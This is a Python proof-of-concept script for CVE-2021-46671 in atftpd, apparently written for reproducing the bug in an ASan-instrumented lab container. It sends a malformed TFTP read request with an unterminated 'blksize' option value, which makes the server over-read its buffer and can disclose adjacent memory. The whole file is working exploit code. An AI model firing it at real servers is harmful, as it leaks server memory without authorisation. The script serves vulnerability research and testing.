#!/usr/bin/env python3
"""PoC for CVE-2021-46671 - atftpd < 0.7.5 out-of-bounds read in options.c.

A well-formed TFTP RRQ is a NUL-separated argz list:
    | opcode(2) | filename \0 | mode \0 | [ optname \0 optvalue \0 ]... |

opt_parse_request() (options.c) walks that list with glibc argz_next(), which
does NO bounds checking. When the request does NOT end in a trailing NUL, the
parser / the subsequent opt_set_options() Strncpy(value, ., VAL_SIZE=256) reads
past the end of the received request, disclosing adjacent server memory
(upstream report: leaks /etc/group). Fixed in 0.7.5 (commit 9cf799c4) by
rejecting any request whose final byte is not '\\0'.

Trigger shape (important): the over-read fires on an unterminated option
*VALUE*, and the option *NAME* must be a real atftp option so that
opt_set_options() actually Strncpy()'s the value. An unterminated option NAME
instead returns ERR cleanly (no over-read). So we send:

    RRQ "test.txt" "octet"  blksize\\0  <UNTERMINATED VALUE>

argz_next() hands opt_set_options() the value pointer, and its
Strncpy(opt.value, value, 256) over-reads up to 256 bytes past the request
buffer -> the bug fires (caught as an ASan use-after-poison by the moving
fence injected at the recvfrom boundary; see the Dockerfile header).

The total datagram length is padded to a multiple of 8 so that the poison
fence (placed at data_buffer + data_size) lands on an 8-byte-aligned shadow
slot with no slack, guaranteeing the first over-read byte is poisoned.

Usage: poc_cve_2021_46671.py [host] [port]   (default 127.0.0.1 6903)
Inside the container: docker exec <ctr> python3 /poc_cve_2021_46671.py 127.0.0.1 69
"""
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 6903

head = b"\x00\x01"          # RRQ opcode
head += b"test.txt\x00"     # filename + NUL
head += b"octet\x00"        # mode + NUL
head += b"blksize\x00"      # a REAL option name + NUL  (so opt_set_options copies the value)
# Unterminated option VALUE: no trailing NUL. opt_set_options() Strncpy()s up to
# VAL_SIZE(256) bytes from here, running off the end of the request buffer.
# Pad so the whole datagram length is a multiple of 8 (poison-fence alignment).
pad = (-len(head)) % 8 or 8
pkt = head + (b"5" * pad)

print(f"[*] CVE-2021-46671 PoC -> {HOST}:{PORT}/udp")
print(f"[*] RRQ {len(pkt)} bytes (len%8={len(pkt) % 8}), last byte = 0x{pkt[-1]:02x} (NON-NUL -> over-read)")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3.0)
try:
    s.sendto(pkt, (HOST, PORT))
    print("[*] sent; waiting for any reply / data leak ...")
    try:
        data, addr = s.recvfrom(2048)
        print(f"[*] reply {len(data)} bytes from {addr}: {data!r}")
    except socket.timeout:
        print("[*] no reply (daemon likely aborted under ASan - check docker logs)")
finally:
    s.close()
